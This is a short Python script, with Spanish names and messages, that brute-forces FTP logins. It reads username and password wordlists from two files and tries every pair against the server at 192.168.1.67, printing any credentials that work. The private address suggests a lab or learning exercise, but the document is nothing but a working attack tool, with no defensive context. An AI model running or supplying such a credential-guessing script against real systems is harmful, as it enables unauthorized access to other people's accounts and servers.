import ftplib

def ataque(ip,user,passwd):
    ftp=ftplib.FTP(ip)

    try:
        ftp.login(user,passwd)
        ftp.quit()
        print(f'Usuario: {user}:{passwd}') 
        return user    
    except:
        print("Falló la autenticación")

ip="192.168.1.67"
usuarios=open('usuarios.txt','r')
usuarios=usuarios.read().split('\n')
password=open('passwords.txt','r')
password=password.read().split('\n')
logg=None

for u in usuarios:
    for p in password:
        logg=ataque(ip,u,p)
        if logg!=None:
            break